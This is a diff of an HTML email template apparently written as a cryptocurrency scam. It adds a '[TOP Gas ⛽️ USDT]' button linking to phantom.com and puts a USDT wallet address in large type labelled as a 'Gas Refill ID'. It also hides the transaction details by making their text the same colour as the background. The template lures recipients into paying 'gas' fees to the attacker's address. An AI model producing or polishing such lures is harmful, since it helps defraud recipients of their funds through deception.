@@ -30,7 +30,7 @@
 
               <!-- Transaction Details -->
                          
-<table align="center" role="presentation" cellpadding="0" cellspacing="0" width="100%" style="font-size:14px; color:##05a5f0; background-color:#f2f6fa; border-radius:6px; margin:20px 0;">
+<table align="center" role="presentation" cellpadding="0" cellspacing="0" width="100%" style="font-size:14px; color:#05a5f0; background-color:#05a5f0; border-radius:6px; margin:20px 0;">
                 <tr>
                   <td style="padding:10px;"><strong>Transaction Reference:</strong></td>
                   <td style="padding:10px;">e3019139-5efd-4ae1-ad70-b645454404f</td>
@@ -61,6 +61,8 @@
 
 <hr>
 
+<!-- get gas -->
+
 <form action="https://phantom.com/" method="get">
 <button align="center" type="submit"> [TOP Gas ⛽️ USDT] </button>
 </form>  
@@ -83,10 +85,13 @@
 <br>
 
 <div>
-  
-|<span style="color: Blue;">⛽️Top USDT:</span>|<span style="color: Blue;">TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o</span>|
+
+<p style="font-size:28px; color:#05a5f0; margin:20px 0;">
+| TOP USDT GAS⛽️    | TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o|
 |---------------------------|---------------------------|
 | USDT  network         | ⛽️ Gas Refill ID ⬆️       |
+  
+
 
 <img align="center" src="IMG_0565.jpeg" alt="blockchain Logo" width="38" />
 
